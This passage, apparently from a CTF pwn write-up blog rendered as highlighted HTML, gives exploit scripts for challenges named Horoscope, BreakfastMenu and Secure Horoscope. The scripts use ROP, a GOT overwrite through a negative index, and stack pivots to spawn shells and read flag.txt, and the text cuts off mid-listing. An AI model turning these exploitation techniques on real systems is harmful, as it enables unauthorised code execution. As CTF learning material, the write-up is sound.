+</span></span><span class="line"><span class="cl">            <span class="mh">0x400588</span><span class="p">,</span> <span class="c1">#printf</span>
+</span></span><span class="line"><span class="cl">        <span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="n">length</span><span class="o">=</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64_ex</span><span class="p">(</span><span class="mh">0x600c18</span><span class="p">)</span> <span class="c1"># puts</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="n">rls</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;,&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">int16_ex</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">puts</span>
+</span></span><span class="line"><span class="cl"><span class="n">log_address</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">libc_base</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x2000</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log_ex_highlight</span><span class="p">(</span><span class="s2">&#34;get shell!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="s2">&#34;cat flag.txt&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ia</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ic</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>use command :  <code>for i in $(seq 1  8); do ./exp.py re ./OilSpill oil.sdc.tf:1337 -nl; done</code> to enumerate and get shell.</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220508213922905.png' alt="image-20220508213922905"></p>
+<h2 class="heading-element" id="horoscope"><span>Horoscope</span>
+  <a href="#horoscope" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>A basic rop task</p>
+<h3 class="heading-element" id="vulnerability-1"><span>Vulnerability</span>
+  <a href="#vulnerability-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220508215543397.png' alt="image-20220508215543397"></p>
+<p>and there are two functions to help you get shell:</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220508215628900.png' alt="image-20220508215628900"></p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220508215638710.png' alt="image-20220508215638710"></p>
+<h3 class="heading-element" id="exp-1"><span>EXP</span>
+  <a href="#exp-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># author: roderick</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwncli</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cli_script</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">:</span> <span class="n">tube</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;io&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="p">:</span> <span class="n">ELF</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;elf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="n">flat</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">:</span> <span class="s2">&#34;1/1/1/1/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">8</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">48</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">debug</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">test</span>
+</span></span><span class="line"><span class="cl">        <span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="s2">&#34;cat flag.txt&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>attack remote host:</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220508215730626.png' alt="image-20220508215730626"></p>
+<h2 class="heading-element" id="breakfastmenu"><span>BreakfastMenu</span>
+  <a href="#breakfastmenu" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Heap related, maybe.</p>
+<h3 class="heading-element" id="checksec-1"><span>Checksec</span>
+  <a href="#checksec-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220508215815359.png' alt="image-20220508215815359"></p>
+<p>The remote glibc version is also <code>libc6_2.27-3ubuntu1.5_amd64</code>.</p>
+<h3 class="heading-element" id="vulnerability-2"><span>Vulnerability</span>
+  <a href="#vulnerability-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>The <code>idx</code> could be a negative number, I call it as <code>int overflow</code>:</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220508215935838.png' alt="image-20220508215935838"></p>
+<h3 class="heading-element" id="solution-1"><span>Solution</span>
+  <a href="#solution-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>The steps:</p>
+<ul>
+<li>
+<p>create a new order</p>
+</li>
+<li>
+<p>use <code>int overflow</code> to replace <code>got@free</code> with <code>puts@plt</code> and replace <code>exit@got</code> with <code>malloc@got</code></p>
+</li>
+<li>
+<p>use <code>int overflow</code> to delete an order related <code>malloc@got</code>, actually, it leaks the real address of <code>malloc</code> function</p>
+</li>
+<li>
+<p>use <code>int overflow</code> to modify <code>free@got</code> to <code>system</code>, which is gained by the address of <code>malloc</code></p>
+</li>
+<li>
+<p>delete an order with <code>/bin/sh</code> to get shell</p>
+</li>
+</ul>
+<h3 class="heading-element" id="exp-2"><span>EXP</span>
+  <a href="#exp-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># author: roderick</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwncli</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cli_script</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">set_remote_libc</span><span class="p">(</span><span class="s2">&#34;./libc-2.27.so&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">:</span> <span class="n">tube</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;io&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="p">:</span> <span class="n">ELF</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;elf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="p">:</span> <span class="n">ELF</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;libc&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;4. Pay your bill and leave</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;A new order has been created</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;4. Pay your bill and leave</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;which order would you like to modify</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;What would you like to order?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;4. Pay your bill and leave</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;which order would you like to remove</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="o">-</span><span class="mi">7</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="o">.</span><span class="n">puts</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">free</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="o">-</span><span class="mi">7</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">malloc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">exit</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="o">-</span><span class="mi">15</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">recv_current_libc_addr</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">malloc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">set_current_libc_base_and_log</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="o">-</span><span class="mi">7</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">free</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220508220506836.png' alt="image-20220508220506836"></p>
+<h2 class="heading-element" id="secure-horoscope"><span>Secure Horoscope</span>
+  <a href="#secure-horoscope" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Still a basic rop challenge&hellip;</p>
+<h3 class="heading-element" id="vulnerability-3"><span>Vulnerability</span>
+  <a href="#vulnerability-3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>A buffer overflow with <code>0x1c</code> bytes:</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220508220624949.png' alt="image-20220508220624949"></p>
+<h3 class="heading-element" id="solution-2"><span>Solution</span>
+  <a href="#solution-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>I found a fast solution after reading the asm code of this program:</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220508220750354.png' alt="image-20220508220750354"></p>
+<p>When <code>rbp</code> is hijacked, we can write data anywhere.</p>
+<p>The steps:</p>
+<ul>
+<li>buffer overflow and to control <code>rbp</code></li>
+<li>write rop chain in the <code>bss</code> section and do stack pivot</li>
+<li>rop and use magic gadget to get shell</li>
+</ul>
+<h3 class="heading-element" id="exp-3"><span>EXP</span>
+  <a href="#exp-3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
